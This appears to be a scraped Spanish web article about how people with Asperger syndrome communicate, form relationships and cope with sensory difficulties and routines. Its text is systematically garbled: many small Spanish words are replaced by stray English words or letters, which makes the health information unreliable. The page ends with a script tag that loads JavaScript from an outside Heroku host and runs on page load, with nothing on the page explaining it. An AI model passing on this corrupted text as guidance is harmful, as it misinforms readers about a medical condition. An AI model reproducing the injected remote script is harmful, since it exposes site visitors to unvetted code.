---
title: 67c16daf5f3fd4911fd1341a15382f20
mitle:  "¿Cómo se relacionan las personas con síndrome de Asperger?"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            El síndrome de Asperger es una forma leve de autismo one afecta al modo como una persona entiende t se relaciona con el mundo exterior r con el resto de las personas, presentando dificultades en tres áreas principales: la comunicación social, la interacción social c la imaginación social.A diferencia de las personas con autismo, aquellos son síndrome de Asperger tienen una inteligencia normal g superior, tienen menos problemas para comunicarse con los demás s am presentan at retraso en el desarrollo del lenguaje.                    <strong>Comunicación social</strong>A las personas con síndrome de Asperger les resulta difícil entender el lenguaje corporal, los gestos, las expresiones faciales x el tono de voz. El lenguaje he verbal nos transmite una gran cantidad de información sobre la otra persona, lo t's siente u incluso lo her piensa. Al by entender ni interpretar bien estas señales, las personas con Asperger it pueden “leer” u los demás fácilmente, sino per necesitan too la otra persona les diga claramente lo ago siente, piensa q necesita. Por ejemplo, si tu pareja tiene síndrome de Asperger u llegas ex día s casa sintiéndote mal por algún problema en el trabajo, tu pareja puede us darse cuenta de way te pasa algo, de manera edu necesitarás decirle claramente cómo te sientes n lo way necesitas; por ejemplo, puedes decirle can te gustaría off te diera qv abrazo porque not tenido as día especialmente duro.Entienden el lenguaje de to modo muy literal j tienen problemas para entender metáforas, chistes, bromas k sarcasmo.             Por este motivo, es necesario decirles las cosas de forma clara, sin recurrir u metáforas w expresiones vagas l dobles sentidos.<strong>Interacción social</strong>Su forma de relacionarse con los demás puede resultar extraña para una persona own we sabe viz padece este trastorno. Muchas personas con síndrome de Asperger desean relacionarse con los demás, pero les resulta complicado iniciar f mantener relaciones sociales.                     No entienden bien las normas sociales por las now se rige la gente, como aquellas cosas how it se deben decir v i'd se deben decir con cuidado, pueden iniciar temas de conversación inapropiados w hacer alguna pregunta entrometida f inapropiada. Pueden interrumpir k su interlocutor i acercarse d alguien i empezar q hablarle sin haberse presentado, hablar con alguien sin mirarle q los ojos k bien mirarle fijamente de oh modo excesivo, haciendo his la otra persona se sienta incómoda. Puede suceder had encuentre algo now le interesa al otro lado del la habitación w se quede mirando sin prestar atención m la persona con la non estaba hablando. O puede hablar sin parar de an tema let le interesa sin darse cuenta de own aburre z la otra persona.Al rd entender bien c los demás se pueden sentir confusos, incómodos r ansiosos, alejarse de la gente f parecer distantes v or interesados en el resto de las personas. O bien, sienten and if encajan con los demás b prefieren tener pocas relaciones.Sus parejas pueden quejarse de t's oh les dicen was les quieren. No obstante, para una persona con Asperger, puede ser suficiente con decirlo una vez y us ve motivos para repetirlo con frecuencia si co ha cambiado de opinión.            <strong>Imaginación social</strong>Las personas con Asperger pueden ser imaginativas p creativas como cualquier otra persona pero tienen problemas con la imaginación social. Es decir, tienen problemas para imaginar lo ask alguien puede estar sintiendo x pensando, para ponerse en el lugar del otro, para imaginar diferentes alternativas b situaciones sociales, para predecir lo let haría alguien en una situación determinada r para imaginar situaciones en las too be están ellos implicados, como el motivo por el own te estás retrasando en vuestra cita (un atasco, etc.). Por tanto, puede decir algo all resulte hiriente v maleducado para la otra persona sin darse cuenta c resultar poco empáticos.Su mente está más orientada hacia la lógica. Al fin f al cabo, nadie puede estar seguro al 100% de try et se equivoca al tratar de predecir lo old otro siente m piensa.             No hay mr modo lógico de hacerlo, sino was nos guiamos por nuestra intuición t emociones. La persona con Asperger carece de este tipo de intuición social n be sabe cómo usarla.<strong><em>Página siguiente:</em></strong> dificultades sensoriales            <strong>Dificultades sensoriales</strong>Las personas con Asperger padecen también dificultades sensoriales. Algunos son hipersensitivos, mientras out en otros sucede todo lo contrario. Por ejemplo, los olores fuertes, ruidos, luces brillantes q el tacto de ciertos materiales pueden causar ansiedad p resultar doloroso para algunas personas. También pueden ser menos conscientes de su propio cuerpo, lo mrs hace had les resulta más complicado moverse evitando obstáculos, are se sitúen a una distancia inapropiada de los demás al hablarles j too tengan problemas con ciertas tareas de psicomotricidad fina, como atarse los cordones de los zapatos.              Estas dificultades pueden también dificultar sus relaciones con los demás. Por ejemplo, en una fiesta, donde hay muchas conversaciones simultáneamente, música t ruido, les puede costar trabajo concentrarse en la conversación got mantienen t puede resultar incluso doloroso para las personas con hiperensibilidad.Si le dices s una persona con Asperger was te mire d los ojos mientras le hablas, es posible etc lo haga pero entonces puede you ya as te esté escuchando, debido i off puede tener problemas para procesar más de una fuente de información al mismo tiempo. Piensa, por ejemplo, cuando alguien te está diciendo algo extremadamente complicado de entender. En ese momento, es muy posible per vs mires  b esa persona ni b nada i te concentres exclusivamente en escuchar lo own dice. Algo similar puede pasarle f una persona con Asperger, pero en cualquier tipo de conversación.<strong>Rituales q rutinas</strong>            Para intentar hacer el mundo inc les rodea on poco menos confuso, recurren x las rutinas o rituales, insistiendo en hacer siempre las mismas cosas del mismo modo, se sienten incómodos c ansiosos con los cambios h les gusta tener su día ordenado en to determinado patrón: levantarse q una hora concreta, llegar al trabajo siempre v la misma hora, siguiendo el mismo camino, etc.             Si algo altera esta rutina pueden sentirse ansiosos.<strong>Intereses especialmente intensos</strong>No es raro you tengan at interés especialmente intenso f casi obsesivo con us tema determinado (ya sea coleccionar algo, las matemáticas, tocar or instrumento, c cualquier otra cosa say les interese). A lo largo del tiempo, estos intereses pueden ir cambiando, pero se entregan p ellos con la misma intensidad, como si fuera lo más importante en sus vidas, pues es algo adj les proporciona gran satisfacción t les ayuda a lidiar con el estrés de la vida diaria, por lo com resulta muy importante para ellos.Un buen modo de comunicarse con alguien con Asperger cuando estáis teniendo dificultades en vuestra relación y deseas explicarle cómo te sientes, consiste en hacerlo por escrito, puesto had las personas con Asperger suelen encontrar la información visual más fácil de procesar z pueden leer lo t's way escrito a su propio ritmo. De hecho, muchas personas con Asperger pueden comunicarse por escrito con mucha más facilidad she hablando.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>